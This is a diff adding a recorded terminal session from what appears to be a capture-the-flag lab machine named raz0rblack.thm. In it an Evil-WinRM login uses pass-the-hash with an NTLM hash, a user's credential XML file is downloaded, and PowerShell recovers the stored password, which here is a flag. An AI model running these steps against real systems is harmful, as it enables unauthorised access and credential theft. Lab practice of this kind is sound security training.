@@ -1,0 +1,52 @@
+Script started on 2025-04-08 16:07:15+03:00 [COMMAND="evil-winrm -i raz0rblack.thm -u lvetrova -H f220d3988deb3f516c73f40ee16c431d" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+                                        
+[0;34mEvil-WinRM shell v3.7[0m
+                                        
+[0;1;33mWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine[0m
+                                        
+[0;35mData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion[0m
+                                        
+[0;34mInfo: Establishing connection to remote endpoint[0m
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\lvetrova\Documents> dir
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\lvetrova\Documents> cd ..
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\lvetrova> dir
+
+
+    Directory: C:\Users\lvetrova
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        9/15/2018  12:19 AM                Desktop
+d-r---        2/25/2021  10:14 AM                Documents
+d-r---        9/15/2018  12:19 AM                Downloads
+d-r---        9/15/2018  12:19 AM                Favorites
+d-r---        9/15/2018  12:19 AM                Links
+d-r---        9/15/2018  12:19 AM                Music
+d-r---        9/15/2018  12:19 AM                Pictures
+d-----        9/15/2018  12:19 AM                Saved Games
+d-r---        9/15/2018  12:19 AM                Videos
+-a----        2/25/2021  10:16 AM           1692 lvetrova.xml
+
+
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\lvetrova> download lvetrova.xml
+                                        
+[0;34mInfo: Downloading C:\Users\lvetrova\lvetrova.xml to lvetrova.xml[0m
+Progress: 100% : |▓▓▓▓▓▓▓▓▓▒|                                                  
+[0;34mInfo: Download successful![0m
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\lvetrova> $Credential = Import-Clixml -Path ".\lvetrova.xml"
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\lvetrova> $Credential.GetNetworkCredential().password
+THM{694362e877adef0d85a92e6d17551fe4}
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\lvetrova> exit
+^C
+                                        
+[0;1;33mWarning: Press "y" to exit, press any other key to continue[0m
+                                        
+[0;34mInfo: Exiting...[0m
+^C                                        
+[0;31mError: An error of type Interrupt happened, message is [0m
+                                        
+[0;31mError: Exiting with code 1[0m
+
+^C
+Script done on 2025-04-08 16:25:47+03:00 [COMMAND_EXIT_CODE="130"]
